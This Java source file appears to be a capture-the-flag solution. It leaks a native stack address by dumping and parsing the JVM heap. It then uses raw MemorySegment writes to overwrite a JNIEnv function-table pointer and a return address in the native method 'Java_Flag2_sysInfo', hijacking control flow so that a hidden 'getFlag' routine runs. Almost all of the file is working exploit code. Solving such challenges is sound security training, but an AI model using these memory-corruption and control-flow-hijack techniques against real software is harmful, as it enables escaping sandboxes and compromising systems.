import module java.base;
import module java.management;
import module jdk.management;

public class Solution {
  // HPROF format spec:
  // https://hg.openjdk.org/jdk6/jdk6/jdk/raw-file/tip/src/share/demo/jvmti/hprof/manual.html
  private static final byte[] PREFIX = {
    0x00, 0x00, 0x00, 0x19, // Length.
    0x00, 0x00,             // First 2 bytes of stack address.
  };
  private static final int MID_LEN = 6;
  private static final byte[] SUFFIX = {
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x6c, // Length of `MemorySegment` (108).
    0x00,                   // `readOnly` false.
    0x00, 0x00, 0x00, 0x00, // Upper 4 bytes of `GlobalSession` reference.
  };

  public static String solve(Object f) throws Exception {
    // Read stack address from heap dump.
    dumpHeap("heap.hprof", true);
    var stackAddr = parseStackAddress("heap.hprof");
    IO.println("Stack address: 0x" + Long.toHexString(stackAddr));

    /*
      Stack layout:
        +---------------------+
        | rbp                 | <- stackAddr - 16
        +---------------------+   \_ `JNIEnv*` of `Java_Flag2_sysInfo`
        | Return address      | <- stackAddr - 8
        +---------------------+
        | struct sysinfo info | <- stackAddr
        +---------------------+   \_ rsp of `Java_Flag2_sysInfo`
        | Rest of the stack   |
        .......................
    */

    // Rewrite `CallStaticObjectMethod` to `getFlag`.
    var jniEnvPtr = readAddr(stackAddr - 16);
    var jniEnv = readAddr(jniEnvPtr);
    var retAddr = readAddr(stackAddr - 8);
    var getFlagAddr = retAddr - 0x138;
    writeAddr(jniEnv + 0x390, getFlagAddr);

    // Rewrite return address to call `getFlag`.
    writeAddr(stackAddr - 8, retAddr - 0x19);

    // Done, just return something.
    return "";
  }

  private static void dumpHeap(String fileName, boolean live) throws IOException {
    // Remove the given file if it exists.
    var file = new File(fileName);
    if (file.exists()) {
      if (!file.delete()) {
        throw new IOException("Failed to delete existing heap dump file");
      }
    }

    MBeanServer server = ManagementFactory.getPlatformMBeanServer();
    HotSpotDiagnosticMXBean mxBean = ManagementFactory.newPlatformMXBeanProxy(
      server,
      "com.sun.management:type=HotSpotDiagnostic",
      HotSpotDiagnosticMXBean.class
    );
    mxBean.dumpHeap(fileName, live);
  }

  private static long parseStackAddress(String heapDumpFile) throws Exception {
    try (var in = new FileInputStream(heapDumpFile)) {
      var data = in.readAllBytes();
      var end = data.length - PREFIX.length - MID_LEN - SUFFIX.length;
      for (int i = 0; i < end; i++) {
        if (matches(data, i, PREFIX) &&
            matches(data, i + PREFIX.length + MID_LEN, SUFFIX)) {
          return bytes6ToLong(data, i + PREFIX.length);
        }
      }
    }
    throw new IllegalStateException("Stack address not found");
  }

  private static boolean matches(byte[] data, int offset, byte[] pattern) {
    for (int i = 0; i < pattern.length; i++) {
      if (data[offset + i] != pattern[i]) {
        return false;
      }
    }
    return true;
  }

  private static long bytes6ToLong(byte[] data, int offset) {
    long value = 0;
    for (int i = 0; i < 6; i++) {
      value = (value << 8) | (data[offset + i] & 0xff);
    }
    return value;
  }

  private static long readAddr(long addr) {
    return MemorySegment.ofAddress(addr)
                        .reinterpret(8)
                        .get(ValueLayout.JAVA_LONG, 0);
  }

  private static void writeAddr(long addr, long value) {
    MemorySegment.ofAddress(addr)
                 .reinterpret(8)
                 .set(ValueLayout.JAVA_LONG, 0, value);
  }
}
